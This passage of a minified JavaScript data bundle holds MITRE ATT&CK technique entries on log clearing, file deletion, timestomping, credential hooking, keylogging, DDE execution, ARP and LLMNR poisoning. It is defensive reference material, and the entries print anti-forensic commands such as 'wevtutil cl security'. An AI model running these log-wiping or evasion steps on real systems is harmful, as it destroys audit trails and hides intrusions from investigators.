system\u003C\u002Fcode\u003E\n* \u003Ccode\u003Ewevtutil cl application\u003C\u002Fcode\u003E\n* \u003Ccode\u003Ewevtutil cl security\u003C\u002Fcode\u003E\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E.";wm.external_references=[{source_name:b,external_id:wn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F001"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fwevtutil",description:"Plett, C. et al.. (2017, October 16). wevtutil. Retrieved July 2, 2018.",source_name:"Microsoft wevtutil Oct 2017"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fsystem.diagnostics.eventlog.clear.aspx",description:"Microsoft. (n.d.). EventLog.Clear Method (). Retrieved July 2, 2018.",source_name:"Microsoft EventLog.Clear"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fpowershell\u002Fmodule\u002Fmicrosoft.powershell.management\u002Fclear-eventlog",description:"Microsoft. (n.d.). Clear-EventLog. Retrieved July 2, 2018.",source_name:"Microsoft Clear-EventLog"}];wm["subtechnique-of"]=$;wo.id=wp;wo["object-type"]=a;wo.name="File Deletion";wo.description="Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fin-depth-look-apt-attack-tools-of-the-trade\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wo.external_references=[{source_name:b,external_id:wp,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F004"},{url:cY,description:cZ,source_name:c_}];wo["subtechnique-of"]=$;wq.id=wr;wq["object-type"]=a;wq.name="Network Share Connection Removal";wq.description="Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E connections can be removed when no longer needed. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0039'\u003ENet\u003C\u002Fa\u003E is an example utility that can be used to remove network share connections with the \u003Ccode\u003Enet use \\\\system\\share \u002Fdelete\u003C\u002Fcode\u003E command. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fbb490717.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wq.external_references=[{source_name:b,external_id:wr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F005"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fbb490717.aspx",description:"Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.",source_name:"Technet Net Use"}];wq["subtechnique-of"]=$;ws.id=wt;ws["object-type"]=a;ws.name="Timestomp";ws.description="Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to hide malware and tools.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwindowsir.blogspot.com\u002F2013\u002F07\u002Fhowto-determinedetect-use-of-anti.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";ws.external_references=[{source_name:b,external_id:wt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1070\u002F006"},{url:"http:\u002F\u002Fwindowsir.blogspot.com\u002F2013\u002F07\u002Fhowto-determinedetect-use-of-anti.html",description:"Carvey, H. (2013, July 23). HowTo: Determine\u002FDetect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.",source_name:"WindowsIR Anti-Forensic Techniques"}];ws["subtechnique-of"]=$;wC.id=wD;wC["object-type"]=a;wC.name="Credential API Hooking";wC.description="Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fen-us\u002Fwdsi\u002Fthreats\u002Fmalware-encyclopedia-description?Name=TrojanSpy:Win32\u002FUrsnif.gen!I&threatId=-2147336918'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F001'\u003EKeylogging\u003C\u002Fa\u003E,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms644959.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.adlice.com\u002Fuserland-rootkits-part-1-iat-hooks\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.mwrinfosecurity.com\u002Four-thinking\u002Fdynamic-hooking-techniques-user-mode\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.exploit-db.com\u002Fdocs\u002F17802.pdf'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.mwrinfosecurity.com\u002Four-thinking\u002Fdynamic-hooking-techniques-user-mode\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n";wC.external_references=[{source_name:b,external_id:wD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F004"},{source_name:"Microsoft TrojanSpy:Win32\u002FUrsnif.gen!I Sept 2017",description:"Microsoft. (2017, September 15). TrojanSpy:Win32\u002FUrsnif.gen!I. Retrieved December 18, 2017.",url:"https:\u002F\u002Fwww.microsoft.com\u002Fen-us\u002Fwdsi\u002Fthreats\u002Fmalware-encyclopedia-description?Name=TrojanSpy:Win32\u002FUrsnif.gen!I&threatId=-2147336918"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms644959.aspx",description:"Microsoft. (n.d.). Hooks Overview. Retrieved December 12, 2017.",source_name:"Microsoft Hook Overview"},{url:C,description:D,source_name:E},{url:"https:\u002F\u002Fwww.adlice.com\u002Fuserland-rootkits-part-1-iat-hooks\u002F",description:"Tigzy. (2014, October 15). Userland Rootkits: Part 1, IAT hooks. Retrieved December 12, 2017.",source_name:"Adlice Software IAT Hooks Oct 2014"},{url:"https:\u002F\u002Fwww.mwrinfosecurity.com\u002Four-thinking\u002Fdynamic-hooking-techniques-user-mode\u002F",description:"Hillman, M. (2015, August 8). Dynamic Hooking Techniques: User Mode. Retrieved December 20, 2017.",source_name:"MWRInfoSecurity Dynamic Hooking 2015"},{url:"https:\u002F\u002Fwww.exploit-db.com\u002Fdocs\u002F17802.pdf",description:"Mariani, B. (2011, September 6). Inline Hooking in Windows. Retrieved December 12, 2017.",source_name:"HighTech Bridge Inline Hooking Sept 2011"},{url:"https:\u002F\u002Fvolatility-labs.blogspot.com\u002F2012\u002F09\u002Fmovp-31-detecting-malware-hooks-in.html",description:"Volatility Labs. (2012, September 24). MoVP 3.1 Detecting Malware Hooks in the Windows GUI Subsystem. Retrieved December 12, 2017.",source_name:"Volatility Detecting Hooks Sept 2012"},{url:"https:\u002F\u002Fgithub.com\u002Fprekageo\u002Fwinhook",description:"Prekas, G. (2011, July 11). Winhook. Retrieved December 12, 2017.",source_name:"PreKageo Winhook Jul 2011"},{url:"https:\u002F\u002Fgithub.com\u002Fjay\u002Fgethooks",description:"Satiro, J. (2011, September 14). GetHooks. Retrieved December 12, 2017.",source_name:"Jay GetHooks Sept 2011"},{url:"https:\u002F\u002Fzairon.wordpress.com\u002F2006\u002F12\u002F06\u002Fany-application-defined-hook-procedure-on-my-machine\u002F",description:"Felici, M. (2006, December 6). Any application-defined hook procedure on my machine?. Retrieved December 12, 2017.",source_name:"Zairon Hooking Dec 2006"},{url:"https:\u002F\u002Feyeofrablog.wordpress.com\u002F2017\u002F06\u002F27\u002Fwindows-keylogger-part-2-defense-against-user-land\u002F",description:"Eye of Ra. (2017, June 27). Windows Keylogger Part 2: Defense against user-land. Retrieved December 12, 2017.",source_name:"EyeofRa Detecting Hooking June 2017"},{url:"http:\u002F\u002Fwww.gmer.net\u002F",description:"GMER. (n.d.). GMER. Retrieved December 12, 2017.",source_name:"GMER Rootkits"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms686701.aspx",description:"Microsoft. (n.d.). Taking a Snapshot and Viewing Processes. Retrieved December 12, 2017.",source_name:"Microsoft Process Snapshot"},{url:"https:\u002F\u002Fsecurity.stackexchange.com\u002Fquestions\u002F17904\u002Fwhat-are-the-methods-to-find-hooked-functions-and-apis",description:"Stack Exchange - Security. (2012, July 31). What are the methods to find hooked functions and APIs?. Retrieved December 12, 2017.",source_name:"StackExchange Hooks Jul 2012"}];wC["subtechnique-of"]=aX;wE.id=wF;wE["object-type"]=a;wE.name="GUI Input Capture";wE.description="Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002'\u003EBypass User Account Control\u003C\u002Fa\u003E).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fbaesystemsai.blogspot.com\u002F2015\u002F06\u002Fnew-mac-os-malware-exploits-mackeeper.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This type of prompt can be used to collect credentials via various languages such as AppleScript\u003Csup\u003E\u003Ca href='https:\u002F\u002Flogrhythm.com\u002Fblog\u002Fdo-you-trust-your-computer\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2016\u002F07\u002F06\u002Fnew-osxkeydnap-malware-hungry-credentials\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and PowerShell\u003Csup\u003E\u003Ca href='https:\u002F\u002Flogrhythm.com\u002Fblog\u002Fdo-you-trust-your-computer\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2015\u002F01\u002F21\u002Fphishing-for-credentials-if-you-want-it-just-ask\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. ";wE.external_references=[{source_name:b,external_id:wF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F002"},{external_id:"CAPEC-659",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F659.html"},{url:"https:\u002F\u002Fbaesystemsai.blogspot.com\u002F2015\u002F06\u002Fnew-mac-os-malware-exploits-mackeeper.html",description:"Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.",source_name:"OSX Malware Exploits MacKeeper"},{source_name:"LogRhythm Do You Trust Oct 2014",url:"https:\u002F\u002Flogrhythm.com\u002Fblog\u002Fdo-you-trust-your-computer\u002F",description:"Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018."},{url:b_,description:b$,source_name:ca},{source_name:"Enigma Phishing for Credentials Jan 2015",url:"https:\u002F\u002Fenigma0x3.net\u002F2015\u002F01\u002F21\u002Fphishing-for-credentials-if-you-want-it-just-ask\u002F",description:"Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018."}];wE["subtechnique-of"]=aX;wG.id=wH;wG["object-type"]=a;wG.name="Keylogging";wG.description="Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fopensecuritytraining.info\u002FKeylogging_files\u002FThe%20Adventures%20of%20a%20Keystroke.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F004'\u003ECredential API Hooking\u003C\u002Fa\u003E, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";wG.external_references=[{source_name:b,external_id:wH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F001"},{external_id:"CAPEC-568",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F568.html"},{url:wz,description:wA,source_name:wB},{source_name:K,url:L,description:M}];wG["subtechnique-of"]=aX;wI.id=wJ;wI["object-type"]=a;wI.name="Web Portal Capture";wI.description="Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E or as part of the initial compromise by exploitation of the externally facing web service.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2015\u002F10\u002F07\u002Fvirtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wI.external_references=[{source_name:b,external_id:wJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1056\u002F003"},{external_id:wx,source_name:c,url:wy},{url:sZ,description:s_,source_name:s$}];wI["subtechnique-of"]=aX;wK.id=wL;wK["object-type"]=a;wK.name="Component Object Model";wK.description="Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F005'\u003EVisual Basic\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms680573.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Specific COM objects also exist to directly perform functions beyond code execution, such as creating a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053'\u003EScheduled Task\u002FJob\u003C\u002Fa\u003E, fileless download\u002Fexecution, and other adversary behaviors related to privilege escalation and persistence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2019\u002F06\u002Fhunting-com-objects.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgoogleprojectzero.blogspot.com\u002F2018\u002F04\u002Fwindows-exploitation-tricks-exploiting.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";wK.external_references=[{source_name:b,external_id:wL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001"},{source_name:eh,url:ei,description:ej},{url:cm,description:cn,source_name:co},{url:my,description:mz,source_name:mA},{url:ek,description:el,source_name:em},{url:en,description:eo,source_name:ep}];wK["subtechnique-of"]=c$;wM.id=wN;wM["object-type"]=a;wM.name="Dynamic Data Exchange";wM.description="Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and\u002For continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fmicrosoft\u002Fmicrosoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fportal.msrc.microsoft.com\u002Fsecurity-guidance\u002Fadvisory\u002FADV170021'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fsecurity\u002F4053440'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMicrosoft Office documents can be poisoned with DDE commands \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2016\u002Fpowershell-c-sharp-and-dde-the-power-within\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.contextis.com\u002Fblog\u002Fcomma-separated-vulnerabilities'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, directly or through embedded files \u003Csup\u003E\u003Ca href='https:\u002F\u002Fposts.specterops.io\u002Freviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, and used to deliver execution via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Fmacro-less-code-exec-in-msword\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E.";wM.external_references=[{source_name:b,external_id:wN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F002"},{url:"https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fmicrosoft\u002Fmicrosoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks\u002F",description:"Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.",source_name:"BleepingComputer DDE Disabled in Word Dec 2017"},{url:"https:\u002F\u002Fportal.msrc.microsoft.com\u002Fsecurity-guidance\u002Fadvisory\u002FADV170021",description:"Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.",source_name:"Microsoft ADV170021 Dec 2017"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fsecurity\u002F4053440",description:"Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.",source_name:"Microsoft DDE Advisory Nov 2017"},{url:"https:\u002F\u002Fsensepost.com\u002Fblog\u002F2016\u002Fpowershell-c-sharp-and-dde-the-power-within\u002F",description:"El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.",source_name:"SensePost PS DDE May 2016"},{url:"https:\u002F\u002Fwww.contextis.com\u002Fblog\u002Fcomma-separated-vulnerabilities",description:"Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.",source_name:"Kettle CSV DDE Aug 2014"},{url:"https:\u002F\u002Fposts.specterops.io\u002Freviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee",description:"Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.",source_name:"Enigma Reviving DDE Jan 2018"},{url:"https:\u002F\u002Fsensepost.com\u002Fblog\u002F2017\u002Fmacro-less-code-exec-in-msword\u002F",description:"Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.",source_name:"SensePost MacroLess DDE Oct 2017"},{url:"https:\u002F\u002Fblog.nviso.be\u002F2017\u002F10\u002F11\u002Fdetecting-dde-in-ms-office-documents\u002F",description:"NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.",source_name:"NVisio Labs DDE Detection Oct 2017"}];wM["subtechnique-of"]=c$;wS.id=wT;wS["object-type"]=a;wS.name="ARP Cache Poisoning";wS.description="Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1040'\u003ENetwork Sniffing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565\u002F002'\u003ETransmitted Data Manipulation\u003C\u002Fa\u003E.\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftools.ietf.org\u002Fhtml\u002Frfc826'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpen-testing.sans.org\u002Fresources\u002Fpapers\u002Fgcih\u002Freal-world-arp-spoofing-105411'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fweb.archive.org\u002Fweb\u002F20200302085133\u002Fhttps:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpages\u002Foperation-cleaver\u002FCylance_Operation_Cleaver_Report.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and\u002For relay data such as credentials, especially those sent over an insecure, unencrypted protocol.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fpen-testing.sans.org\u002Fresources\u002Fpapers\u002Fgcih\u002Freal-world-arp-spoofing-105411'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n";wS.external_references=[{source_name:b,external_id:wT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557\u002F002"},{source_name:"RFC826 ARP",url:"https:\u002F\u002Ftools.ietf.org\u002Fhtml\u002Frfc826",description:"Plummer, D. (1982, November). An Ethernet Address Resolution Protocol. Retrieved October 15, 2020."},{source_name:"Sans ARP Spoofing Aug 2003",url:"https:\u002F\u002Fpen-testing.sans.org\u002Fresources\u002Fpapers\u002Fgcih\u002Freal-world-arp-spoofing-105411",description:"Siles, R. (2003, August). Real World ARP Spoofing. Retrieved October 15, 2020."},{source_name:lB,description:lC,url:lD}];wS["subtechnique-of"]=da;wU.id=wV;wU["object-type"]=a;wU.name="LLMNR\u002FNBT-NS Poisoning and SMB Relay";wU.description="By responding to LLMNR\u002FNBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FLink-Local_Multicast_Name_Resolution'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Flibrary\u002Fcc958811.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)\u002FNBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification\u002Fauthentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1040'\u003ENetwork Sniffing\u003C\u002Fa\u003E and crack the hashes offline through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. \u003Csup\u003E\u003Ca 